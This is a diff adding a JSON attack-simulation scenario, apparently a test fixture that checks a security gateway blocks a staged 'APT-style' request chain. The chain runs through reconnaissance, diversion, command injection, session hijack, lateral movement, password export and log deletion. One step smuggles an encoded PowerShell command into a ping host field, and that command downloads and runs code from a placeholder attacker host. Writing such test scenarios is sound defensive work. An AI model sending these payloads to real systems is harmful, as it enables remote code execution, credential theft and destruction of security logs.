@@ -1,0 +1,244 @@
+{
+  "id": "apt-multi-vector-campaign",
+  "name": "APT-Style Multi-Vector Persistent Campaign",
+  "category": "Advanced Persistent Threat",
+  "difficulty": "Expert",
+  "description": "Ultra-sophisticated Advanced Persistent Threat campaign combining multiple attack vectors, diversion tactics, living-off-the-land techniques, and coordinated multi-stage operations mimicking nation-state actors",
+  "tags": [
+    "apt",
+    "multi-vector",
+    "living-off-land",
+    "diversion",
+    "nation-state",
+    "persistent",
+    "coordinated"
+  ],
+  "steps": [
+    {
+      "id": "apt-recon-infrastructure-1",
+      "name": "Infrastructure Reconnaissance - DNS Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/healthz",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +http://duckduckgo.com/duckduckbot.html)"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      }
+    },
+    {
+      "id": "apt-recon-employees-1",
+      "name": "Social Engineering Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/healthcare/records/search",
+        "headers": {
+          "User-Agent": "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/)",
+          "Accept": "application/json"
+        },
+        "params": {
+          "q": "admin manager director ceo cto security"
+        }
+      },
+      "execution": {
+        "delayMs": 4500
+      },
+      "dependsOn": [
+        "apt-recon-infrastructure-1"
+      ]
+    },
+    {
+      "id": "apt-diversion-noisy-1",
+      "name": "High-Volume Diversion Attack - Phase 1",
+      "stage": "diversion",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Hydra/9.4"
+        },
+        "body": "{\"username\": \"admin\", \"password\": \"password123\", \"obvious_bruteforce\": true}"
+      },
+      "execution": {
+        "delayMs": 100
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-recon-employees-1"
+      ]
+    },
+    {
+      "id": "apt-stealth-entry-1",
+      "name": "Stealth Entry Vector - Legitimate Channel Abuse",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/genai/knowledge/upload",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"filename\":\"business-proposal.pdf\", \"content\": \"Interested in your API services. Please send documentation to: https://filebin.net/apt-c2-channel-0x7f\"}"
+      },
+      "execution": {
+        "delayMs": 8000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-diversion-noisy-1"
+      ]
+    },
+    {
+      "id": "apt-diversion-noisy-2",
+      "name": "High-Volume Diversion Attack - Phase 2",
+      "stage": "diversion",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/admin/config",
+        "headers": {
+          "User-Agent": "sqlmap/1.7.8#stable (http://sqlmap.org)"
+        }
+      },
+      "execution": {
+        "delayMs": 50
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-stealth-entry-1"
+      ]
+    },
+    {
+      "id": "apt-living-off-land-1",
+      "name": "Living Off The Land - Legitimate API Abuse",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/diagnostics/ping",
+        "headers": {
+          "User-Agent": "Microsoft System Health Tool/1.0",
+          "Authorization": "Bearer system_diagnostic_token"
+        },
+        "body": {
+          "host": "8.8.8.8; powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjADIALgBlAHYAaQBsAC4AYwBvAG0ALwBwAGgAYQBzAGUAMgAiACkA"
+        }
+      },
+      "execution": {
+        "delayMs": 12000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-diversion-noisy-2"
+      ]
+    },
+    {
+      "id": "apt-credential-harvest-1",
+      "name": "Credential Harvesting via Session Hijack",
+      "stage": "credential-access",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/auth/refresh",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Cookie": "session=hijacked_admin_session_token"
+        },
+        "body": "{\"refresh_token\": \"stolen_refresh_token_abc123\", \"grant_type\": \"refresh_token\", \"scope\": \"admin read write delete\"}"
+      },
+      "execution": {
+        "delayMs": 15000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-living-off-land-1"
+      ]
+    },
+    {
+      "id": "apt-lateral-movement-1",
+      "name": "Lateral Movement via Internal API",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/integrations/discovery",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer compromised_service_token",
+          "X-Internal-Service": "user-management"
+        }
+      },
+      "execution": {
+        "delayMs": 18000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-credential-harvest-1"
+      ]
+    },
+    {
+      "id": "apt-data-staging-1",
+      "name": "Data Staging for Exfiltration",
+      "stage": "collection",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/admin/users/export",
+        "headers": {
+          "User-Agent": "Internal-Backup-Service/2.1",
+          "Authorization": "Bearer escalated_privileges_token"
+        },
+        "params": {
+          "format": "encrypted",
+          "include_passwords": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 22000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-lateral-movement-1"
+      ]
+    },
+    {
+      "id": "apt-anti-forensics-1",
+      "name": "Anti-Forensics Log Cleanup",
+      "stage": "defense-evasion",
+      "request": {
+        "method": "POST",
+        "url": "/api/logs/deletion",
+        "headers": {
+          "User-Agent": "Log-Rotation-Service/1.4",
+          "Authorization": "Bearer log_management_token"
+        },
+        "body": {
+          "systems": ["siem", "firewall", "waf"]
+        }
+      },
+      "execution": {
+        "delayMs": 34000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-data-staging-1"
+      ]
+    }
+  ]
+}
